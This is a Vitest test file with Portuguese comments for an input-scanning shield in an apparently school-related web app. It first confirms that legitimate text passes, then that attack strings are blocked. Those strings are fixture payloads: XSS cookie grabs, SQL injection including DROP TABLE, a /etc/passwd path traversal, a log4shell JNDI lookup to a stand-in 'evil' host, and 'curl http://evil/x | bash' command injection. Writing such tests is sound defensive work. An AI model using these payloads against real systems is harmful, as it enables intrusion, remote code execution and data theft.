import { describe, it, expect } from 'vitest';
import { __testing, SentinelaBlock } from '../../src/security/sentinela';

const { scan, DEFAULTS } = __testing;

function avaliar(valor: unknown) {
  return () => scan(valor, 'body', 0, { keys: 0, limits: DEFAULTS });
}

/**
 * O escudo tem duas obrigacoes de igual peso: barrar ataque e NAO barrar
 * cliente. A versao anterior cumpria so a segunda metade da promessa — o regex
 * bloqueava qualquer apostrofo, o que reprovava "Maria D'Avila" e nao impedia
 * injecao nenhuma, porque o Prisma ja parametriza.
 *
 * Por isso os falsos positivos vem primeiro aqui.
 */
describe('sentinela — conteudo legitimo passa', () => {
  const legitimos: Array<[string, unknown]> = [
    ['nome com apostrofo', { name: "Maria D'Avila Santos" }],
    ['nome com acento e hifen', { name: 'João Paulo Ribeiro-Nunes' }],
    ['endereco com numero e traco', { address: 'Rua Haddock Lobo, 400 - apto 71-B' }],
    ['observacao com aspas', { note: 'A mae disse: "buscar 10 min mais cedo"' }],
    ['escola com E comercial', { school: 'Colegio Anglo & Cia' }],
    ['senha com simbolos', { password: "S3nh@-F0rte'2026#ok" }],
    ['comentario com cerquilha', { note: 'Turma #3 - portao lateral' }],
    ['valor monetario brasileiro', { amount: '1.234,56' }],
    ['data e hora', { when: '2026-09-09T07:30:00-03:00' }],
    ['texto com menor que', { note: 'chegada < 07:20 conta como adiantado' }],
    ['emoji e acento', { note: 'Aniversario da Beatriz 🎂 amanha' }],
    ['SQL como palavra em frase', { note: 'A escola vai selecionar as turmas ate sexta' }],
  ];

  for (const [nome, payload] of legitimos) {
    it(`aceita ${nome}`, () => {
      expect(avaliar(payload)).not.toThrow();
    });
  }
});

describe('sentinela — ataque e barrado', () => {
  const ataques: Array<[string, unknown]> = [
    ['script tag', { note: '<script>fetch("/api/v1/students").then(r=>r.json())</script>' }],
    ['handler em svg', { note: '<svg onload=alert(document.cookie)>' }],
    ['img onerror', { bio: '<img src=x onerror="location=\'//evil\'">' }],
    ['javascript: uri', { photoUrl: 'javascript:alert(1)' }],
    ['data:text/html', { photoUrl: 'data:text/html;base64,PHNjcmlwdD4=' }],
    ['tautologia SQL', { email: "admin' OR '1'='1" }],
    ['comando SQL empilhado', { name: "teste; DROP TABLE Student" }],
    ['union select', { search: '1 UNION SELECT password FROM "User"' }],
    ['comentario SQL terminal', { email: "admin'--" }],
    ['travessia de caminho', { file: '../../../../etc/passwd' }],
    ['log4shell', { userAgent: '${jndi:ldap://evil/x}' }],
    ['injecao de comando', { name: 'teste; curl http://evil/x | bash' }],
  ];

  for (const [nome, payload] of ataques) {
    it(`bloqueia ${nome}`, () => {
      expect(avaliar(payload)).toThrow(SentinelaBlock);
    });
  }
});

describe('sentinela — estrutura abusiva', () => {
  it('bloqueia poluicao de prototipo pela chave', () => {
    expect(avaliar(JSON.parse('{"__proto__":{"isAdmin":true}}'))).toThrow(SentinelaBlock);
    expect(avaliar({ constructor: { prototype: {} } })).toThrow(SentinelaBlock);
  });

  it('bloqueia operador NoSQL como chave, mas aceita como texto', () => {
    expect(avaliar({ email: { $ne: null } })).toThrow(SentinelaBlock);
    // O mesmo texto num valor e so texto — e um recado legitimo poderia conte-lo.
    expect(avaliar({ note: 'custo $ne aumentou' })).not.toThrow();
  });

  it('bloqueia aninhamento profundo', () => {
    let deep: Record<string, unknown> = { fim: true };
    for (let i = 0; i < DEFAULTS.maxDepth + 3; i++) deep = { nivel: deep };
    expect(avaliar(deep)).toThrow(SentinelaBlock);
  });

  it('bloqueia array gigante', () => {
    expect(avaliar({ ids: new Array(DEFAULTS.maxArrayLength + 1).fill('x') })).toThrow(SentinelaBlock);
  });

  it('bloqueia excesso de chaves', () => {
    const bomba: Record<string, number> = {};
    for (let i = 0; i < DEFAULTS.maxKeys + 10; i++) bomba[`k${i}`] = i;
    expect(avaliar(bomba)).toThrow(SentinelaBlock);
  });

  it('bloqueia string absurdamente longa', () => {
    expect(avaliar({ note: 'a'.repeat(DEFAULTS.maxStringLength + 1) })).toThrow(SentinelaBlock);
  });

  it('bloqueia byte nulo', () => {
    expect(avaliar({ name: `arquivo\u0000.jpg` })).toThrow(SentinelaBlock);
  });
});
